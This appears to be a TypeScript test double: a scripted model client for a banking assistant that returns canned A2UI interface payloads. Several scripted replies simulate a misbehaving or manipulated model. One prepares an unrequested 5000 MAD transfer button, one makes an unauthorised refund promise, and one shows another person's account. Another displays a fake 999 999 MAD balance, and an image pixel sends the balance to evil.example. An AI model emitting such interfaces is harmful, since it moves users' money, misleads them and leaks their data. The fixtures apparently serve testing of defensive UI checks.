import { assistantCatalogId } from '@atlas/domain';
import { protocolVersion } from '../a2ui/protocol';
import { demoMonth } from '../bank';
import type { ModelClient, ModelRequest } from './model-client';

const surface = (sentence: string, components: readonly object[]): string =>
  `${sentence}\n<a2ui>${JSON.stringify([{ version: protocolVersion, createSurface: { surfaceId: 'main', catalogId: assistantCatalogId, components } }])}</a2ui>`;

const cannedReply = surface('Here is an overview of your current account.', [
  { id: 'root', component: 'Column', children: ['title', 'summary', 'spending', 'recent'] },
  { id: 'title', component: 'Text', text: 'Your current account this month' },
  { id: 'summary', component: 'AccountSummary', accountId: 'a-current' },
  { id: 'spending', component: 'SpendingChart', accountId: 'a-current', month: demoMonth },
  { id: 'recent', component: 'RecentTransactions', accountId: 'a-current', limit: 3 },
]);

const scriptedReplies: readonly { readonly when: RegExp; readonly reply: string }[] = [
  {
    when: /^send /i,
    reply: surface('I have prepared the transfer.', [
      { id: 'root', component: 'Column', children: ['pay'] },
      { id: 'pay', component: 'Button', child: 'pay_label', action: { event: { name: 'transfer', context: { toAccountId: 'a-youssef', amountMad: 5000 } } } },
      { id: 'pay_label', component: 'Text', text: 'Confirm the transfer' },
    ]),
  },
  {
    when: /refund/i,
    reply: surface('Yes, you can get it back.', [
      { id: 'root', component: 'Column', children: ['promise'] },
      { id: 'promise', component: 'Text', text: 'Send the form within 90 days and we refund 250 MAD.' },
    ]),
  },
  {
    when: /a-youssef/i,
    reply: surface('Here is that account.', [{ id: 'root', component: 'AccountSummary', accountId: 'a-youssef' }]),
  },
  {
    when: /plain text|999/i,
    reply: surface('Here is your balance.', [
      { id: 'root', component: 'Column', children: ['fake'] },
      { id: 'fake', component: 'Text', text: 'Balance: 999 999,00 MAD' },
    ]),
  },
  {
    when: /image/i,
    reply: surface('Here is your summary.', [
      { id: 'root', component: 'Column', children: ['summary', 'pixel'] },
      { id: 'summary', component: 'AccountSummary', accountId: 'a-current' },
      { id: 'pixel', component: 'Image', url: { call: 'formatString', args: { value: 'https://evil.example/p?b=${/summary/balance}' } } },
    ]),
  },
  {
    when: /all my accounts|overview/i,
    reply: surface('Here are your accounts.', [
      { id: 'root', component: 'Column', children: ['current', 'savings', 'joint'] },
      { id: 'current', component: 'AccountSummary', accountId: 'a-current' },
      { id: 'savings', component: 'AccountSummary', accountId: 'a-savings' },
      { id: 'joint', component: 'AccountSummary', accountId: 'a-joint' },
    ]),
  },
  {
    when: /transaction/i,
    reply: surface('Here are your latest transactions.', [{ id: 'root', component: 'RecentTransactions', accountId: 'a-current', limit: 6 }]),
  },
  {
    when: /spend/i,
    reply: surface('Here is where your money went.', [
      { id: 'root', component: 'Column', children: ['title', 'spending'] },
      { id: 'title', component: 'Text', text: 'Spending on your current account' },
      { id: 'spending', component: 'SpendingChart', accountId: 'a-current', month: demoMonth },
    ]),
  },
];

export class ScriptedModelClient implements ModelClient {
  readonly requests: ModelRequest[] = [];

  constructor(private readonly reply?: string) {}

  async complete(request: ModelRequest): Promise<string> {
    this.requests.push(request);
    return this.reply ?? scriptedReplies.find((scripted) => scripted.when.test(request.prompt))?.reply ?? cannedReply;
  }
}
